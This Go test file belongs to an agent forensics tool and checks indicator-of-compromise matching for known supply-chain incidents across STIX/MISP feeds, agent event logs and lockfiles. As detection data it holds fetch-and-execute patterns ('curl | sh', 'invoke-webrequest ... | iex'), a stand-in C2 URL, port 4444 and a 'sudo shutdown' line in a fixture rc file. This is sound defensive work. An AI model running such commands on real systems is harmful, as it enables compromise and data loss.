package ioc

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/efij/AgentDFIR/v3/internal/schema"
)

func TestEmbeddedPacksValid(t *testing.T) {
	incs, err := Embedded()
	if err != nil {
		t.Fatal(err)
	}
	if len(incs) < 8 {
		t.Fatalf("want ≥ 8 embedded incidents, got %d", len(incs))
	}
	for _, i := range incs {
		if len(i.Sources) == 0 || len(i.Indicators) == 0 || i.FirstSeen == "" {
			t.Errorf("%s: needs sources, indicators and first_seen", i.ID)
		}
		for _, s := range i.Sources {
			if !strings.HasPrefix(s, "https://") {
				t.Errorf("%s: source %q is not an https URL", i.ID, s)
			}
		}
	}
}

func TestPackageMatch(t *testing.T) {
	nx := Indicator{Kind: KindPackage, Ecosystem: "npm", Value: "nx", Versions: []string{"21.5.0"}}
	if !nx.MatchPackage("npm", "nx", "21.5.0") || nx.MatchPackage("npm", "nx", "21.4.0") || nx.MatchPackage("npm", "nx", "") {
		t.Error("exact version match wrong")
	}
	pm := Indicator{Kind: KindPackage, Ecosystem: "npm", Value: "postmark-mcp", FromVersion: "1.0.16"}
	if !pm.MatchPackage("npm", "postmark-mcp", "1.0.18") || pm.MatchPackage("npm", "postmark-mcp", "1.0.9") {
		t.Error("from_version match wrong")
	}
	lf := Indicator{Kind: KindPackage, Ecosystem: "pypi", Value: "langflow", BelowVersion: "1.3.0"}
	for v, want := range map[string]bool{"1.2.9": true, "1.0.0": true, "1.3.0": false, "1.4.2": false, "": false} {
		if got := lf.MatchPackage("pypi", "langflow", v); got != want {
			t.Errorf("below_version langflow@%q = %v, want %v", v, got, want)
		}
	}
	if lf.Label() != "pypi:langflow@<1.3.0" {
		t.Errorf("label %q", lf.Label())
	}
}

func TestDomainBoundary(t *testing.T) {
	d := Indicator{Kind: KindDomain, Value: "npm-cache.com"}
	for s, want := range map[string]bool{
		"curl https://npm-cache.com/x":      true,
		"curl https://cdn.npm-cache.com/x":  true,
		"see npm-cache.com.":                true,
		"curl https://my-npm-cache.com/x":   false,
		"curl https://npm-cache.com.evil/x": false,
	} {
		if got := d.MatchText(s); got != want {
			t.Errorf("%q: got %v want %v", s, got, want)
		}
	}
}

func TestSTIXAndMISP(t *testing.T) {
	stix := `{"type":"bundle","id":"bundle--1","objects":[
	 {"type":"indicator","id":"indicator--a","name":"c2","pattern_type":"stix","pattern":"[domain-name:value = 'evil[.]example'] OR [url:value = 'hxxps://evil.example/drop']"},
	 {"type":"indicator","id":"indicator--b","pattern":"[file:hashes.'SHA-256' = '46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09']"},
	 {"type":"indicator","id":"indicator--c","pattern":"[process:command_line MATCHES '(?i)curl .*\\\\| *sh']"},
	 {"type":"indicator","id":"indicator--d","pattern":"[network-traffic:dst_port = 4444]"}]}`
	incs, skipped, err := Parse([]byte(stix), "t.json")
	if err != nil {
		t.Fatal(err)
	}
	if len(incs) != 1 || len(incs[0].Indicators) != 4 || skipped != 1 {
		t.Fatalf("stix: %d incidents, %+v, skipped %d", len(incs), incs, skipped)
	}
	if incs[0].Indicators[0].Value != "evil.example" || incs[0].Indicators[1].Value != "evil.example/drop" {
		t.Errorf("refang/url normalize failed: %+v", incs[0].Indicators[:2])
	}
	misp := `{"Event":{"uuid":"u1","info":"test","date":"2026-01-01","Attribute":[{"type":"domain","value":"bad.example"},{"type":"filename|sha256","value":"payload.js|46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09"},{"type":"comment","value":"hello there"}]}}`
	incs, skipped, err = Parse([]byte(misp), "m.json")
	if err != nil || len(incs) != 1 || len(incs[0].Indicators) != 3 || skipped != 1 {
		t.Fatalf("misp: %+v skipped=%d err=%v", incs, skipped, err)
	}
	if _, _, err := Parse([]byte(`{"incidents":[{"id":"x","indicators":[{"kind":"command_regex","value":"(("}]}]}`), "bad"); err == nil {
		t.Error("invalid regex accepted")
	}
}

func TestHuntClassifiesWhere(t *testing.T) {
	incs, _ := Embedded()
	incs, _ = Select(incs, []string{"s1ngularity"})
	evs := []schema.Event{
		{EventType: schema.EventHumanPrompt, Summary: "what is s1ngularity-repository?", Timestamp: "2026-09-01T00:00:00Z"},
		{EventType: schema.EventToolCall, Tool: "Bash", ToolCallID: "t1", Command: "gh repo create s1ngularity-repository-0 --public", Timestamp: "2026-09-02T00:00:00Z", Corroboration: schema.StateObserved},
		{EventType: schema.EventToolResult, ToolCallID: "t1", Summary: "added 1 package: nx@21.5.0", Timestamp: "2026-09-02T00:01:00Z"},
		{EventType: schema.EventToolCall, Tool: "Bash", Command: "grep -rn s1ngularity-repository docs/ && cat > n.md <<'EOF'\ngh repo create s1ngularity-repository\nEOF", Timestamp: "2026-09-02T00:02:00Z"},
		{EventType: schema.EventToolCall, Tool: "WebFetch", ToolCallID: "t2", Timestamp: "2026-09-02T00:03:00Z"},
		{EventType: schema.EventToolResult, ToolCallID: "t2", Summary: "the worm created s1ngularity-repository repos", Timestamp: "2026-09-02T00:03:10Z"},
	}
	v := Hunt(incs, Inputs{Events: evs})[0]
	if v.Status != "HIT" {
		t.Fatalf("status %s", v.Status)
	}
	got := map[string]string{}
	for _, h := range v.Hits {
		got[h.Indicator.Label()] = h.Where
	}
	if got["repo_name:s1ngularity-repository"] != WhereObserved || got["npm:nx@20.9.0|20.10.0|20.11.0|20.12.0|21.5.0|21.6.0|21.7.0|21.8.0"] != WhereOutput {
		t.Errorf("classification: %v", got)
	}
	if len(v.Mentions) != 3 {
		t.Errorf("mention not separated: %+v", v.Mentions)
	}
	f := Findings([]Verdict{v})
	if len(f) != 2 || f[0].Severity != "CRITICAL" || f[1].Severity != "HIGH" {
		t.Errorf("findings: %+v", f)
	}
	// only a mention, inside the incident window: not a hit
	v = Hunt(incs, Inputs{Events: []schema.Event{{EventType: schema.EventHumanPrompt, Summary: "what is s1ngularity-repository?", Timestamp: "2025-08-27T00:00:00Z"}}})[0]
	if v.Status != "NO_EVIDENCE" || len(Findings([]Verdict{v})) != 0 {
		t.Errorf("mention-only became %s", v.Status)
	}
	// evidence window after the incident
	v = Hunt(incs, Inputs{Events: []schema.Event{{EventType: schema.EventToolCall, Command: "ls", Timestamp: "2026-09-20T00:00:00Z"}}})[0]
	if v.Status != "INCONCLUSIVE" {
		t.Errorf("late evidence window: %s %s", v.Status, v.Reason)
	}
	v = Hunt(incs, Inputs{Events: evs, Simulated: true})[0]
	if v.Status != "SIMULATED" || !strings.HasPrefix(Findings([]Verdict{v})[0].Title, "[SIMULATED]") {
		t.Errorf("simulated not labelled: %s", v.Status)
	}
}

func TestHuntWalkLockfiles(t *testing.T) {
	dir := t.TempDir()
	write := func(p, s string) {
		p = filepath.Join(dir, p)
		_ = os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("app/package-lock.json", `{"lockfileVersion":3,"packages":{"":{},"node_modules/nx":{"version":"21.5.0"},"node_modules/keyv":{"version":"5.0.0"}}}`)
	write("web/yarn.lock", "\"keyv@^6.0.0\":\n  version \"6.0.0\"\n")
	write("mono/pnpm-lock.yaml", "packages:\n  '@nx/devkit@20.9.0':\n    resolution: {}\n")
	write("svc/node_modules/.package-lock.json", `{"packages":{"node_modules/postmark-mcp":{"version":"1.0.17"}}}`)
	write("svc/node_modules/postmark-mcp/index.js", "BCC")
	write(".zshrc", "export PATH=$PATH\nsudo shutdown -h 0\n")
	write(".vscode/extensions/amazonwebservices.amazon-q-vscode-1.84.0/package.json", "{}")
	incs, _ := Embedded()
	vs := Hunt(incs, Inputs{Path: dir})
	status := map[string]int{}
	for _, v := range vs {
		if v.Status == "HIT" {
			status[v.Incident.ID] = len(v.Hits)
		}
	}
	for _, id := range []string{"s1ngularity", "keyv-wave", "postmark-mcp", "amazon-q-wiper"} {
		if status[id] == 0 {
			t.Errorf("%s not found by walk; hits=%v", id, status)
		}
	}
	for _, v := range vs {
		if v.Incident.ID == "s1ngularity" && len(v.Hits) < 3 {
			t.Errorf("s1ngularity: want lockfile nx, pnpm @nx/devkit and rc-file hits, got %+v", v.Hits)
		}
	}
}

func TestCommandRegexCaseInsensitive(t *testing.T) {
	incs, _, err := Parse([]byte(`{"type":"bundle","id":"bundle--2","objects":[{"type":"indicator","id":"i","pattern":"[process:command_line MATCHES 'Invoke-WebRequest.*IEX']"}]}`), "x")
	if err != nil {
		t.Fatal(err)
	}
	if !incs[0].Indicators[0].MatchText("powershell invoke-webrequest http://x | iex") {
		t.Error("uppercase regex did not match lowercased text")
	}
}
